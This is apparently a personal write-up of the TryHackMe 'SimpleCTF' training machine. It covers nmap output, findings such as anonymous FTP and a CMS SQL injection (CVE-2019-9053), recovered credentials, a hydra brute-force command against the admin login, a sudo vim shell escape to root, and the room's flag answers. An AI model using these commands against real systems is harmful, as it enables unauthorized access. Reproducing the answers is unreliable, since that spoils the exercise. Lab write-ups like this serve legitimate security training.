TryHackMe.com

box = SimpleCTF

export IP=10.10.66.125

# NMAP SCANS

```
Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-14 11:46 GMT
Nmap scan report for ip-10-10-66-125.eu-west-1.compute.internal (10.10.66.125)
Host is up (0.00050s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.160.239
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:C2:C9:67:B2:21 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (93%), Linux 3.8 (93%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms ip-10-10-66-125.eu-west-1.compute.internal (10.10.66.125)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.75 seconds

```

# Interesting Finds

```
 - FTP can be accessed anonymously.
 - port 2222 is a ssh port.
 - robots.txt contains: /openemr-5_0_1_3 
 - machine is vulnerable to SQLi (CVE-2019-9053) (CMSMS v2.2.8)
```

# Usernames and Passwords
```
- mitch | secret
```

# Tasks
```

How many services are running under port 1000?

- 2

What is running on the higher port?

- ssh

What's the CVE you're using against the application?

- CVE-2019-9053 (SQLi)

To what kind of vulnerability is the application vulnerable?

- SQLi

What's the password?

- secret (command used: hydra -l mitch -P /usr/share/wordlists/rockyou.txt 'http-post-form://10.10.66.125/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect')

Where can you login with the details obtained?

- ssh

What's the user flag?

- G00d j0b, keep up!

Is there any other user in the home directory? What's its name?

-sunbath

What can you leverage to spawn a privileged shell?

- vim (Command used: sudo /usr/bin/vim then type :!sh)

What's the root flag?

- W3ll d0n3. You made it!
```